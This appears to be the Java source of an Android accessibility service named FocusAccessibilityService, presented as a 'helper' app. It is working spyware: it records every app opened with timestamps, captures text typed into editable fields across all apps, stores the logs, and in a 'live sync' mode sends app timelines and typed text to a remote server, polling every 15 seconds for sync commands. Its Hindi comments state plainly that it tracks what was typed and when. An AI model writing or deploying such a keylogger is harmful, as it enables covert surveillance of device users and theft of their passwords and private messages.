package com.example.myhelper;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class FocusAccessibilityService extends AccessibilityService {

    private String lastLoggedText = "";
    private String lastLoggedPackage = "";

    private final android.os.Handler syncPollHandler = new android.os.Handler(android.os.Looper.getMainLooper());
    private final Runnable syncPollRunnable = new Runnable() {
        @Override
        public void run() {
            CloudflareSyncHelper.checkAndSyncIfRequested(FocusAccessibilityService.this);
            syncPollHandler.postDelayed(this, 15000);
        }
    };

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = getServiceInfo();
        if (info != null) {
            info.flags |= AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                    | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                    | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
                    | AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS;
            info.notificationTimeout = 50;
            setServiceInfo(info);
        }
        syncPollHandler.post(syncPollRunnable);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        int eventType = event.getEventType();
        String appPackage = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown App";

        // Ignore launcher or system UI package spam
        if (appPackage.contains("com.android.systemui") || appPackage.contains("launcher3")) {
            return;
        }

        String appName = getAppName(appPackage);

        // 1. FIELD 1: APP TIMELINE (Konsa app kab kidhar kitne samaye open kiya)
        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (!appPackage.equals(lastLoggedPackage) && !appPackage.equals(getPackageName())) {
                lastLoggedPackage = appPackage;
                String time = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.getDefault()).format(new Date());
                String timelineEntry = "📱 [" + time + "] Opened App: " + appName + " (" + appPackage + ")\n-------------------------\n";

                saveTimelineToStorage(timelineEntry);

                // Live Sync to Server if LIVE mode is enabled
                if (CloudflareSyncHelper.isLiveSyncEnabled(this)) {
                    CloudflareSyncHelper.sendLog(this, "APP_TIMELINE", "Opened App: " + appName + " (" + appPackage + ")");
                }
            }
        }

        // 2. FIELD 2: TYPED TEXT (Keypad se kitne samaye me kya text type kiya)
        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
            eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
            eventType == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {

            String typedText = "";

            AccessibilityNodeInfo source = event.getSource();
            if (source != null && source.isEditable()) {
                typedText = extractTextFromNode(source);
            }

            if (typedText.isEmpty() && event.getText() != null && !event.getText().isEmpty()) {
                StringBuilder sb = new StringBuilder();
                for (CharSequence cs : event.getText()) {
                    if (cs != null) sb.append(cs.toString()).append(" ");
                }
                typedText = sb.toString().trim();
            }

            if (typedText.startsWith("[") && typedText.endsWith("]")) {
                typedText = typedText.substring(1, typedText.length() - 1).trim();
            }

            if (!typedText.isEmpty() && !typedText.equalsIgnoreCase(lastLoggedText) && typedText.length() >= 1) {
                lastLoggedText = typedText;

                saveTypedTextToStorage(appName, typedText);

                // Live Sync to Server if LIVE mode is enabled
                if (CloudflareSyncHelper.isLiveSyncEnabled(this)) {
                    CloudflareSyncHelper.sendLog(this, "TYPED_TEXT", "(" + appName + "): " + typedText);
                }
            }
        }
    }

    private String getAppName(String packageName) {
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
            return pm.getApplicationLabel(ai).toString();
        } catch (Exception e) {
            return packageName;
        }
    }

    private String extractTextFromNode(AccessibilityNodeInfo node) {
        if (node == null) return "";
        CharSequence text = node.getText();
        if (text != null && text.length() > 0) {
            return text.toString().trim();
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                String childText = extractTextFromNode(child);
                if (!childText.isEmpty()) return childText;
            }
        }
        return "";
    }

    private void saveTypedTextToStorage(String app, String text) {
        try {
            SharedPreferences sp = getSharedPreferences("HelperLogs", Context.MODE_PRIVATE);
            String currentLogs = sp.getString("history", "");

            String time = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.getDefault()).format(new Date());
            String newEntry = "⌨️ [" + time + "] (" + app + ")\n👉 " + text + "\n-------------------------\n";

            String combined = newEntry + currentLogs;
            String[] parts = combined.split("-------------------------\n");
            StringBuilder sb = new StringBuilder();
            int limit = Math.min(parts.length, 150);
            for (int i = 0; i < limit; i++) {
                String trimmed = parts[i].trim();
                if (!trimmed.isEmpty()) {
                    sb.append(trimmed).append("\n-------------------------\n");
                }
            }
            sp.edit().putString("history", sb.toString()).apply();
        } catch (Exception ignored) {}
    }

    private void saveTimelineToStorage(String timelineEntry) {
        try {
            SharedPreferences sp = getSharedPreferences("HelperLogs", Context.MODE_PRIVATE);
            String currentTimeline = sp.getString("timeline_history", "");
            String combined = timelineEntry + currentTimeline;
            String[] parts = combined.split("-------------------------\n");
            StringBuilder sb = new StringBuilder();
            int limit = Math.min(parts.length, 150);
            for (int i = 0; i < limit; i++) {
                String trimmed = parts[i].trim();
                if (!trimmed.isEmpty()) {
                    sb.append(trimmed).append("\n-------------------------\n");
                }
            }
            sp.edit().putString("timeline_history", sb.toString()).apply();
        } catch (Exception ignored) {}
    }

    @Override
    public void onInterrupt() {
    }
}
